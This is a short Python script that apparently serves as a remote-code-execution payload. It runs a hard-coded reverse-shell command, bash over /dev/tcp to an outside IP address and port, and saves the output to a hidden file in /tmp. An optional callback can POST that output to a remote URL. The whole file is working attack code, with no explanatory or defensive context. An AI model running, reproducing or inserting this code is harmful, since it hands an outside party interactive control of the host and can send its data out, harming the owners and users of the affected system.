import subprocess, os, urllib.request

CMD = 'bash -i >& /dev/tcp/207.180.204.102/8888 0>&1'
CALLBACK = ''
OUTFILE = '/tmp/.rce_out'

try:
    out = subprocess.check_output(CMD, shell=True, stderr=subprocess.STDOUT, timeout=30)
    out = out.decode("utf-8", errors="replace")
except Exception as e:
    out = "ERROR: " + str(e)

try:
    with open(OUTFILE, "w") as f:
        f.write(out)
except Exception:
    pass

if CALLBACK:
    try:
        req = urllib.request.Request(
            CALLBACK, data=out.encode("utf-8"), method="POST",
            headers={"Content-Type": "text/plain"},
        )
        urllib.request.urlopen(req, timeout=10)
    except Exception:
        pass
